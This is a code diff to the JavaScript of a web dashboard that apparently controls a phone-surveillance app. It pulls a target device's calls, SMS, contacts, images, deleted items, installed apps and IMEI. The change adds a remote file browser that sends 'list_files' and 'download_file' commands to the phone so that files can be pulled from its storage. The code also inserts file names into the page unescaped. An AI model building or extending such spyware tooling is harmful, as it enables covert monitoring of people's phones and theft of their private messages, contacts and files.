@@ -19,6 +19,7 @@ let lastSmsCount = 0;
 let lastDeletedCount = 0;
 let notificationShown = false;
 let soundPlayedForDevice = false;
+let currentFilePath = "/storage/emulated/0";
 
 function logout() { sessionStorage.removeItem('logged_in'); window.location.href = 'login.html'; }
 function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
@@ -183,19 +184,140 @@ async function updateLiveData() {
     } catch (e) {}
 }
 
+// ✅ البيانات الأساسية فورًا
 async function loadAllData() {
     if (!currentDevice) return;
     await loadCalls();
     await loadSMS();
     await loadContacts();
-    await loadImages();
-    await loadApps();
     await loadDeviceInfo();
-    await loadDeleted();
-    await loadFiles();
 }
 
-// ✅ تحميل المحذوفات
+// ✅ التحميل عند فتح التبويب فقط
+function switchTab(tabName) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
+    if (tab) tab.classList.add('active');
+    const pane = document.getElementById(`${tabName}Tab`);
+    if (pane) pane.classList.add('active');
+    
+    // ✅ تحميل حسب التبويب
+    if (tabName === 'images') loadImages();
+    if (tabName === 'deleted') loadDeleted();
+    if (tabName === 'files') loadFileList(currentFilePath);
+    if (tabName === 'apps') loadApps();
+    if (tabName === 'device') loadDeviceInfo();
+    if (tabName === 'contacts') loadContacts();
+}
+
+// ============ مدير الملفات ============
+
+// ✅ تحميل قائمة الملفات
+async function loadFileList(path) {
+    try {
+        currentFilePath = path;
+        const pathInput = document.getElementById('currentPath');
+        if (pathInput) pathInput.value = path;
+        
+        // ✅ إرسال أمر للتطبيق
+        await fetch('/api.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                device: currentDevice,
+                command: `list_files:${path}`
+            })
+        });
+        
+        // ✅ انتظر قليلًا ثم اعرض
+        setTimeout(async () => {
+            const response = await fetch(`/api.php?action=get_file_list&device=${encodeURIComponent(currentDevice)}`);
+            const data = await response.json();
+            displayFileList(data.files || data);
+        }, 3000);
+    } catch (e) {}
+}
+
+// ✅ عرض قائمة الملفات
+function displayFileList(files) {
+    const div = document.getElementById('filesList');
+    if (!div) return;
+    div.innerHTML = '';
+    
+    if (!files || files.length === 0) {
+        div.innerHTML = '<p style="color:#888;">المجلد فارغ</p>';
+        return;
+    }
+    
+    files.forEach(file => {
+        const item = document.createElement('div');
+        item.className = 'conversation-item';
+        
+        if (file.is_directory) {
+            item.innerHTML = `
+                <div class="conversation-avatar">📁</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${file.name}</div>
+                    <div class="conversation-preview">مجلد</div>
+                </div>
+                <div class="conversation-time">${formatDate(file.last_modified)}</div>
+            `;
+            item.onclick = () => loadFileList(file.path);
+        } else {
+            item.innerHTML = `
+                <div class="conversation-avatar">📄</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${file.name}</div>
+                    <div class="conversation-preview">${formatBytes(file.size)}</div>
+                </div>
+                <div class="file-actions">
+                    <button class="action-btn" onclick="downloadPhoneFile('${file.path}')">⬇️ تحميل</button>
+                    <button class="action-btn" onclick="viewPhoneFile('${file.path}')">👁️ عرض</button>
+                </div>
+            `;
+        }
+        
+        div.appendChild(item);
+    });
+}
+
+// ✅ تحميل ملف من الهاتف
+async function downloadPhoneFile(path) {
+    await fetch('/api.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            device: currentDevice,
+            command: `download_file:${path}`
+        })
+    });
+    alert('✅ تم طلب التحميل');
+}
+
+// ✅ عرض ملف
+async function viewPhoneFile(path) {
+    await fetch('/api.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            device: currentDevice,
+            command: `download_file:${path}`
+        })
+    });
+    alert('✅ جاري التحميل للعرض');
+}
+
+// ✅ الانتقال للأعلى
+function navigateUp() {
+    const parts = currentFilePath.split('/');
+    parts.pop();
+    const parentPath = parts.join('/') || '/';
+    loadFileList(parentPath);
+}
+
+// ============ باقي الدوال ============
+
 async function loadDeleted() {
     try {
         const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
@@ -209,7 +331,6 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ تحميل الملفات
 async function loadFiles() {
     try {
         const response = await fetch(`/api.php?action=get_files&device=${encodeURIComponent(currentDevice)}`);
@@ -245,7 +366,6 @@ async function loadFiles() {
     } catch (e) {}
 }
 
-// ✅ عرض المحذوفات مع التفاصيل
 function displayDeleted() {
     const div = document.getElementById('deletedList');
     if (!div) return;
@@ -474,15 +594,6 @@ async function loadDeviceInfo() {
         if (!info || Object.keys(info).length === 0) return;
         div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
     } catch (e) {}
-}
-
-function switchTab(tabName) {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
-    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
-    if (tab) tab.classList.add('active');
-    const pane = document.getElementById(`${tabName}Tab`);
-    if (pane) pane.classList.add('active');
 }
 
 function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
